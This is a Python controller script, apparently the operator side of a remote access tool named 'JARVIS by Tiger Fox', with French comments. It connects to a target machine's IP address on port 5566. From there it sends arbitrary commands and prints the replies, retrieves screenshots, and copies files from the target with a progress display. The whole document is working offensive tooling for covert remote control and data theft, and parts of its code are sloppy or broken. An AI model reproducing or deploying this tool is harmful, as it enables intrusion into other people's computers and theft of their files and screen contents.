import socket
from time import sleep
from os.path import getsize as gett
############################### affichage de l'art ###########################
import sys
from colorama import init
init(strip=not sys.stdout.isatty()) # strip colors if stdout is redirected
from termcolor import cprint 
from pyfiglet import figlet_format

cprint(figlet_format('JARVIS by Tiger Fox ', font='starwars'),
       'green', attrs=['bold'])
################################################################################
def extract(text):
    resultat= text.split(maxsplit=1)
    if len(resultat)>=2: 
        return resultat[1]
    else:
        return "" #retoune le dexieme partie de la chaine en parametre hors mis le mot clé
def firstWord(text):
    resultat= text.split(" ")
    return resultat[0] #retourne le premier mot de la chaine en parametre    
def reception():
    sleep(0.5)
    banana=False
    if banana==True:
        pass
    else :
        recu=''
        print ("Vous etes connecte")

        accepte = "non"
        num = 0
        pourcent = 0
        taille='2'
        taillecopie=0
        taillecopie=int(taillecopie)
        # Boucle temps que l'ont est connecte
        ############################################
        while (taillecopie<float(taille)*99/100):
            recu = ""
            recu = socket.recv(8000)
            if accepte=="non":
                recu=recu.decode("utf8")
            else:
                pass
            if not recu : break

            if accepte == "non": # Condition si on a pas deja envoyer le nom et la taille du fichier
                    nomFich = recu.split("NAME ")[1]
                    nomFich = nomFich.split("OCTETS ")[0]
                    taille = recu.split("OCTETS ")[1]
                    print( " >> Fichier '" + nomFich + "' [" + taille + " Ko]")

                    accepte = input(" >> Acceptez vous le transfert [o/n] : ") # demande si on accepte ou pas le transfert                               

                    if accepte == "o" or accepte == "oui": # Si oui en lenvoi au client et on cree le fichier
                        go="GO"
                        go=go.encode("utf8")
                        socket.send(go)
                        print ( "transfert en cours veuillez patienter...")
                    
                        f = open(nomFich, "wb")
                        identifier = "oui"
                        taille = float(taille) * 1024 # Conversion de la taille en octets pour le %
                                            
                    else :
                        socket.send("Bye") # Si pas accepte on ferme le programme
                        exit()

            
            elif recu == "BYE": # Si on a recu "BYE" le transfer est termine
                f.close()
                print ( "transfert termine !")
                break
                
            else: # Sinon on ecrit au fur et a mesure dans le fichier
                f.write(recu)
                taillecopie=float(gett(nomFich))

                if taille > 8000: # Si la taille est plus grande que 8000 on s'occupe du %

                    # Condition pour afficher le % du transfert :
                    if pourcent == 0 and num > taille / 100 * 10 and num < taille / 100 * 20:
                        print (" >> 10%")
                        pourcent = 1
                    elif pourcent == 1 and num > taille / 100 * 20 and num < taille / 100 * 30:
                        print (" >> 20%")
                        pourcent = 2
                    elif pourcent < 3 and num > taille / 100 * 30 and num < taille / 100 * 40:
                        print (" >> 30%")
                        pourcent = 3
                    elif pourcent < 4 and num > taille / 100 * 40 and num < taille / 100 * 50:
                        print (" >> 40%")
                        pourcent = 4
                    elif pourcent < 5 and num > taille / 100 * 50 and num < taille / 100 * 60:
                        print(" >> 50%")
                        pourcent = 5
                    elif pourcent < 6 and num > taille / 100 * 60 and num < taille / 100 * 70:
                        print (" >> 60%")
                        pourcent = 6
                    elif pourcent < 7 and num > taille / 100 * 70 and num < taille / 100 * 80:
                        print(" >> 70%")
                        pourcent = 7
                    elif pourcent < 8 and num > taille / 100 * 80 and num < taille / 100 * 90:
                        print (" >> 80%")
                        pourcent = 8
                    elif pourcent < 9 and num > taille / 100 * 95 and num < taille / 100 * 100:
                        print (" >> 90%" )                   
                        pourcent = 9
                        break
                        
                    num = num + 8000        
            


#########################################################################################
##############################################################################################


connected=False
while  connected==False:
    try:
        h=input("adresse ip de la cible (du type --> '000.0.0.0')-->: ")
        if h=='':
            h='127.0.0.1'
        host, port=h,5566
        socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.connect((host, port))
        connected=True
        print("vous etes désormais connecté a l'appareil : {} \n".format(host))
    except:
        print("une erreur s'est produite veuillez essayer à nouveau ou verifier que la cible est connectée au reseau...\n")    
while connected==True:        
    command=input("veuilez saisir une commande pour la cible ->>> ") 
    if command=='capture':
        command=command.encode("utf8")
        socket.sendall(command) 
        ###### reception de la capture
        sleep(0.5)
        reception()
        print('recu')
    elif firstWord(command)=="copie":
        command=command.encode("utf8")
        socket.sendall(command)
        sleep(0.5)
        reception()
    elif command=="voir" or command=="liste":
        command=command.encode("utf8")
        socket.sendall(command)
        reponse=socket.recv(1024)########### il recois la reponse 
        reponse=reponse.decode("utf8")
        print(reponse)    
    else:
        command=command.encode("utf8")
        socket.sendall(command)#######il envoie la commande
        reponse=socket.recv(1024)########### il recois la reponse 
        reponse=reponse.decode("utf8")
        print(reponse)
       